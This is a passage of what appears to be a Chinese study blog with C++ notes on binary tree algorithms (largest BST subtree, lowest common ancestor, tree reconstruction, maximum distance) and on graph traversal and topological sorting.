leftInfo.maxBSTSubtreeSize;<br>    <span class="hljs-type">int</span> p2 = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">if</span> (rightInfo != null) p2 = rightInfo.maxBSTSubtreeSize;<br>    <span class="hljs-type">int</span> p3 = <span class="hljs-number">-1</span>;  <span class="hljs-comment">//接下来是一堆coding问题</span><br>    <span class="hljs-type">bool</span> leftBST = leftInfo == null ? <span class="hljs-literal">true</span> : (leftInfo.maxBSTSubtreeSize == leftInfo.allSize);<br>    <span class="hljs-type">bool</span> rightBST = rightInfo == null ? <span class="hljs-literal">true</span> : (rightInfo.maxBSTSubtreeSize == rightInfo.allSize);<br>    <span class="hljs-keyword">if</span> (leftBST &amp;&amp; rightBST) &#123;<br>        <span class="hljs-type">bool</span> leftMaxLessX = leftInfo == null ? <span class="hljs-literal">true</span> : (leftInfo.max &lt; x.val); <span class="hljs-comment">//左数小于x</span><br>        <span class="hljs-type">bool</span> rightMinMoreX = rightInfo == null ? <span class="hljs-literal">true</span> : (x.val &lt; rightInfo.min);<br>        <span class="hljs-keyword">if</span> (leftMaxLessX &amp;&amp; rightMinMoreX) &#123;<br>            <span class="hljs-type">int</span> leftSize = leftInfo == null ? <span class="hljs-number">0</span> : leftInfo.allSize;<br>            <span class="hljs-type">int</span> rightSize = rightInfo == null ? <span class="hljs-number">0</span> : rightInfo.allSize;<br>            p3 = leftSize + rightSize + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 当前节点也是BST子树的一部分</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> Info(max(p1, max(p2, p3)), allSize, max, min);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">largestBSTSubtree</span><span class="hljs-params">(TreeNode* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> process(head).maxBSTSubtreeSize;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="最近公共祖先"><a href="#最近公共祖先" class="headerlink" title="最近公共祖先"></a>最近公共祖先</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//最近公共祖先</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// 定义树节点</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> &#123;</span><br>    <span class="hljs-type">int</span> val;<br>    TreeNode* left;<br>    TreeNode* right;<br>    TreeNode(<span class="hljs-type">int</span> x) : val(x), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 用于存储返回信息的结构体</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span><br>    <span class="hljs-type">bool</span> findA;<br>    <span class="hljs-type">bool</span> findB;<br>    TreeNode* ans;<br><br>    Info(<span class="hljs-type">bool</span> fA, <span class="hljs-type">bool</span> fB, TreeNode* an) : findA(fA), findB(fB), ans(an) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 处理树节点的递归函数</span><br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(TreeNode* x, TreeNode* a, TreeNode* b)</span> &#123;<br>    <span class="hljs-keyword">if</span> (x == nullptr) &#123;<br>        <span class="hljs-keyword">return</span> Info(<span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, nullptr);<br>    &#125;<br><br>    <span class="hljs-comment">// 递归处理左右子树</span><br>    Info leftInfo = process(x-&gt;left, a, b);<br>    Info rightInfo = process(x-&gt;right, a, b);<br><br>    <span class="hljs-comment">// 当前节点是否是a或b</span><br>    <span class="hljs-type">bool</span> findA = (x == a) || leftInfo.findA || rightInfo.findA;<br>    <span class="hljs-type">bool</span> findB = (x == b) || leftInfo.findB || rightInfo.findB;<br><br>    TreeNode* ans = nullptr;<br><br>    <span class="hljs-comment">// 如果左子树或右子树已经找到了结果，则返回相应的结果</span><br>    <span class="hljs-keyword">if</span> (leftInfo.ans != nullptr) &#123;<br>        ans = leftInfo.ans;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rightInfo.ans != nullptr) &#123;<br>        ans = rightInfo.ans;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果当前节点是a和b的共同祖先，则返回当前节点</span><br>        <span class="hljs-keyword">if</span> (findA &amp;&amp; findB) &#123;<br>            ans = x;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> Info(findA, findB, ans);<br>&#125;<br><br><span class="hljs-comment">// 获取最低公共祖先</span><br>TreeNode* <span class="hljs-title function_">lowestAncestor</span><span class="hljs-params">(TreeNode* head, TreeNode* a, TreeNode* b)</span> &#123;<br>    <span class="hljs-keyword">return</span> process(head, a, b).ans;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="根据前序遍历和中序遍历重建二叉树："><a href="#根据前序遍历和中序遍历重建二叉树：" class="headerlink" title="根据前序遍历和中序遍历重建二叉树："></a>根据前序遍历和中序遍历重建二叉树：</h4><p><strong>代码实现</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt; preorder;<br>    vector&lt;<span class="hljs-type">int</span>&gt; inorder;<br><br>    <span class="hljs-comment">// 主函数：传入前序和中序遍历数组，开始构建二叉树</span><br>    TreeNode* buildTree(vector&lt;<span class="hljs-type">int</span>&gt;&amp; preorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder) &#123;<br>        <span class="hljs-built_in">this</span>-&gt;preorder = preorder;<br>        <span class="hljs-built_in">this</span>-&gt;inorder = inorder;<br>        <span class="hljs-keyword">return</span> build(<span class="hljs-number">0</span>, preorder.size() - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, inorder.size() - <span class="hljs-number">1</span>);<br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// 递归构建二叉树</span><br>    TreeNode* build(<span class="hljs-type">int</span> l1, <span class="hljs-type">int</span> r1, <span class="hljs-type">int</span> l2, <span class="hljs-type">int</span> r2) &#123;<br>        <span class="hljs-keyword">if</span> (l1 &gt; r1) <span class="hljs-keyword">return</span> nullptr; <span class="hljs-comment">// 递归结束条件</span><br><br>        <span class="hljs-comment">// 构建当前子树的根节点</span><br>        TreeNode* root = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(preorder[l1]);<br><br>        <span class="hljs-comment">// 在中序遍历中找到根节点的位置</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mid</span> <span class="hljs-operator">=</span> l2;<br>        <span class="hljs-keyword">while</span> (inorder[mid] != root-&gt;val) ++mid;<br><br>        <span class="hljs-comment">// 计算左子树的长度，并递归构建左右子树</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">leftTreeSize</span> <span class="hljs-operator">=</span> mid - l2;<br>        root-&gt;left = build(l1 + <span class="hljs-number">1</span>, l1 + leftTreeSize, l2, mid - <span class="hljs-number">1</span>);<br>        root-&gt;right = build(l1 + leftTreeSize + <span class="hljs-number">1</span>, r1, mid + <span class="hljs-number">1</span>, r2);<br><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//找到二叉树中最大距离</span><br><span class="hljs-comment">//x作为头节点时，要左右最大高度，x不作为头节点时，要左和右统计出来的最大距离，总结要高度和最大距离，最大距离的计算：x左右的最大距离，x高度得出来的距离取max</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> value;<br>    Node* left;<br>    Node* right;<br>    Node(<span class="hljs-type">int</span> data) : value(data), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Info</span> &#123;</span><br>    <span class="hljs-type">int</span> maxDistance;<br>    <span class="hljs-type">int</span> height;<br>    Info(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> h) : maxDistance(m), height(h) &#123;&#125;<br>&#125;;<br><br>Info <span class="hljs-title function_">process</span><span class="hljs-params">(Node* x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!x) &#123;<br>        <span class="hljs-keyword">return</span> Info(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 如果是空节点，最大距离为0，高度为0</span><br>    &#125;<br>    Info leftInfo = process(x-&gt;left);<br>    Info rightInfo = process(x-&gt;right);<br>    <br>    <span class="hljs-type">int</span> height = max(leftInfo.height, rightInfo.height) + <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-comment">// 计算三种情况的最大值</span><br>    <span class="hljs-type">int</span> p1 = leftInfo.maxDistance;<br>    <span class="hljs-type">int</span> p2 = rightInfo.maxDistance;<br>    <span class="hljs-type">int</span> p3 = leftInfo.height + rightInfo.height + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 当前节点的最大距离为左子树高度 + 右子树高度 + 1</span><br><br>    <span class="hljs-type">int</span> maxDistance = max(&#123;p1, p2, p3&#125;);<br>    <span class="hljs-keyword">return</span> Info(maxDistance, height);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxDistance</span><span class="hljs-params">(Node* head)</span> &#123;<br>    <span class="hljs-keyword">return</span> process(head).maxDistance;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>- </p><ul><li><strong>分析</strong>：<ul><li>前序遍历的第一个元素是当前子树的根节点。</li><li>在中序遍历中找到根节点，划分出左子树和右子树。</li><li>递归地对左右子树进行同样的处理。</li></ul></li><li><strong>时间复杂度</strong>：O(n)，其中 n 为节点数量。</li></ul><h4 id="找到两个节点的最近公共祖先："><a href="#找到两个节点的最近公共祖先：" class="headerlink" title="找到两个节点的最近公共祖先："></a><strong>找到两个节点的最近公共祖先</strong>：</h4><p><strong>问题描述</strong>：                                                                                                                                                           </p><p> 先求出父结点，然后用向上标记法<br>p 向上一直到 root 标红色<br>q向上，第一次遇到红色时，就找到了LCA</p><p><strong>代码实现</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java">#include &lt;iostream&gt;<br>using namespace std;<br><br><span class="hljs-comment">// 树的节点结构</span><br>struct TreeNode &#123;<br>    <span class="hljs-type">int</span> val;<br>    TreeNode* left;<br>    TreeNode* right;<br>    TreeNode(<span class="hljs-type">int</span> x) : val(x), left(nullptr), right(nullptr) &#123;&#125;<br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    TreeNode* p = nullptr;<br>    TreeNode* q = nullptr;<br>    TreeNode* ans = nullptr;<br><br>    <span class="hljs-comment">// 寻找二叉树中两个节点的最近公共祖先</span><br>    TreeNode* Ansestor(TreeNode* root, TreeNode* p, TreeNode* q) &#123;<br>        <span class="hljs-built_in">this</span>-&gt;p = p;<br>        <span class="hljs-built_in">this</span>-&gt;q = q;<br>        ans = nullptr;  <span class="hljs-comment">// 确保 ans 在每次调用时都为 nullptr</span><br>        dfs(root);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br>    <span class="hljs-comment">// 深度优先搜索辅助函数，返回包含 p 和 q 的标记</span><br>    pair&lt;bool, bool&gt; <span class="hljs-title function_">dfs</span><span class="hljs-params">(TreeNode* root)</span> &#123;<br>        <span class="hljs-keyword">if</span> (root == nullptr) <span class="hljs-keyword">return</span> &#123;<span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>&#125;;<br><br>        <span class="hljs-comment">// 递归查找左子树和右子树</span><br>        pair&lt;bool, bool&gt; leftResult = dfs(root-&gt;left);<br>        pair&lt;bool, bool&gt; rightResult = dfs(root-&gt;right);<br><br>        <span class="hljs-comment">// 当前节点是否包含 p 或 q 的状态</span><br>        pair&lt;bool, bool&gt; result;<br>        result.first = leftResult.first || rightResult.first || root == p;<br>        result.second = leftResult.second || rightResult.second || root == q;<br><br>        <span class="hljs-comment">// 若当前节点同时包含 p 和 q 且 ans 尚未被设置，则将当前节点设置为答案</span><br>        <span class="hljs-keyword">if</span> (result.first &amp;&amp; result.second &amp;&amp; ans == nullptr) &#123;<br>            ans = root;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><hr><h2 id="十六-图"><a href="#十六-图" class="headerlink" title="十六.图"></a>十六.图</h2><h3 id="图的写法"><a href="#图的写法" class="headerlink" title="图的写法"></a>图的写法</h3><p>其他形式的图全抽象为————出边数组实现</p><p>无向图版本</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// edges = &#123;&#123;0, 1&#125;,&#123;1, 2&#125;,&#123;2, 3&#125;,&#123;0, 2&#125;,&#123;3, 4&#125;&#125;;</span><br><span class="hljs-comment">//to = &#123; &#123;1, 2&#125;, &#123;0, 2&#125;, &#123;1, 3, 0&#125;, &#123;2, 4&#125;, &#123;3&#125; &#125;;</span><br>          <span class="hljs-number">0</span>         <span class="hljs-number">1</span>         <span class="hljs-number">2</span>        <span class="hljs-number">3</span>     <span class="hljs-number">4</span><br><span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge:edges)&#123; <span class="hljs-comment">//找到最大编号</span><br>    <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">int</span> y = edge[<span class="hljs-number">1</span>];<br>    n = <span class="hljs-built_in">max</span>(n,<span class="hljs-built_in">max</span>(x,y));<br>&#125;<br>n++;<br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">to</span>(n);  <span class="hljs-comment">// 每个节点对应一个空的 vector&lt;int&gt;</span><br><span class="hljs-keyword">for</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge:edges)&#123;<br>    <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">int</span> y = edge[<span class="hljs-number">1</span>];<br>    to[x].<span class="hljs-built_in">push_back</span>(y);  <br>    to[y].<span class="hljs-built_in">push_back</span>(x);<br>&#125;<br></code></pre></td></tr></table></figure><p>有向图带路径版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0</span>: (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>) (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)      matrix<br><span class="hljs-number">1</span>: (<span class="hljs-number">2</span>, <span class="hljs-number">3</span>) <br><span class="hljs-number">2</span>: (<span class="hljs-number">3</span>, <span class="hljs-number">4</span>) <br><span class="hljs-number">3</span>: <br><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt; convertToAdjacencyListWithWeights(<span class="hljs-type">const</span> <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix) &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; edge : matrix) &#123;<br>        <span class="hljs-type">int</span> from = edge[<span class="hljs-number">1</span>];  <span class="hljs-comment">// 起始节点</span><br>        <span class="hljs-type">int</span> to = edge[<span class="hljs-number">2</span>];    <span class="hljs-comment">// 目标节点</span><br>        n = max(n, max(from, to));  <span class="hljs-comment">// 找到最大的节点编号</span><br>    &#125;<br>    n++; <span class="hljs-comment">// 因为节点编号是从 0 开始的，所以图的大小应该是最大编号 + 1</span><br>    <br>    <span class="hljs-comment">// 第二步：初始化邻接表，用 pair 存储目标节点和边的权重</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt; adjList(n);<br>    <br>    <span class="hljs-comment">// 第三步：根据输入的矩阵填充邻接表</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; edge : matrix) &#123;<br>        <span class="hljs-type">int</span> weight = edge[<span class="hljs-number">0</span>];  <span class="hljs-comment">// 边的权重</span><br>        <span class="hljs-type">int</span> from = edge[<span class="hljs-number">1</span>];    <span class="hljs-comment">// 起始节点</span><br>        <span class="hljs-type">int</span> to = edge[<span class="hljs-number">2</span>];      <span class="hljs-comment">// 目标节点</span><br>        adjList[from].push_back(&#123;to, weight&#125;);  <span class="hljs-comment">// 将边加入邻接表</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> adjList;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>DFS</strong>：判断</p><p>DFS 是一种图或树的遍历算法，它沿着一条路径尽可能深入，然后回溯，继续探索其他路径。</p><p>DFS 的实现方式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//记得初始化</span><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; to; <span class="hljs-comment">//构建出边数组</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title">visited</span><span class="hljs-params">(n,<span class="hljs-literal">false</span>)</span></span>;<br><span class="hljs-type">bool</span> hasCycle = <span class="hljs-literal">false</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> fa)</span> </span>&#123;<br>    visited[x] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>        <span class="hljs-keyword">if</span>(y == fa) <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">if</span> (!visited[y]) &#123;<br>            <span class="hljs-built_in">dfs</span>(y,x);  <span class="hljs-comment">// 递归访问未访问的邻居</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            hasClcye = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>BFS</strong>：</p><p>BFS 的实现方式</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bfs</span><span class="hljs-params">(<span class="hljs-type">int</span> start)</span> </span>&#123;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">depth</span><span class="hljs-params">(n,<span class="hljs-number">-1</span>)</span></span>;<br>    queue&lt;<span class="hljs-type">int</span>&gt; q;<br>    q.<span class="hljs-built_in">push</span>(start);  <span class="hljs-comment">// 将起点加入队列</span><br>    depth[start] = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 标记起点已访问</span><br><br>    <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>        <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();  <span class="hljs-comment">// 从队列中取出一个节点</span><br><br>        <span class="hljs-comment">// 访问该节点的所有邻居</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>            <span class="hljs-keyword">if</span>(depth[y] != <span class="hljs-number">-1</span>) <span class="hljs-keyword">continue</span>;<br>            depth[y] = depth[x] + <span class="hljs-number">1</span>;<br>            q.<span class="hljs-built_in">push</span>(y);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>BFS 有向图————拓扑排序 </p><p>来验证是否能正确排序版</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">to</span>(n);  <span class="hljs-comment">// 这里是已经构建好的to</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">inDeg</span><span class="hljs-params">(n, <span class="hljs-number">0</span>)</span></span>;    <span class="hljs-comment">// 创建并初始化 inDeg</span><br><span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123; <br>    <span class="hljs-type">int</span> from = edge[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">int</span> toNode = edge[<span class="hljs-number">0</span>];<br>    to[from].<span class="hljs-built_in">push_back</span>(toNode);<br>    inDeg[toNode]++;<br>&#125;<br>vector&lt;<span class="hljs-type">int</span>&gt; sortOrder;  <span class="hljs-comment">// 修改为正确的变量名</span><br>queue&lt;<span class="hljs-type">int</span>&gt; q;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    <span class="hljs-keyword">if</span> (inDeg[i] == <span class="hljs-number">0</span>) &#123;<br>        q.<span class="hljs-built_in">push</span>(i);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>    <span class="hljs-type">int</span> x = q.<span class="hljs-built_in">front</span>();<br>    q.<span class="hljs-built_in">pop</span>();  <br>    sortOrder.<span class="hljs-built_in">push_back</span>(x);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>        inDeg[y]--;<br>        <span class="hljs-keyword">if</span> (inDeg[y] == <span class="hljs-number">0</span>) &#123;<br>            q.<span class="hljs-built_in">push</span>(y);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">return</span> sortOrder.<span class="hljs-built_in">size</span>() == n;<br><span class="hljs-comment">// 输出最终的排序结果</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : sortOrder) &#123;<br>    cout &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><br>cout &lt;&lt; endl;  <span class="hljs-comment">// 换行，输出结束</span><br><br></code></pre></td></tr></table></figure><p>输出所有拓扑排序版</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 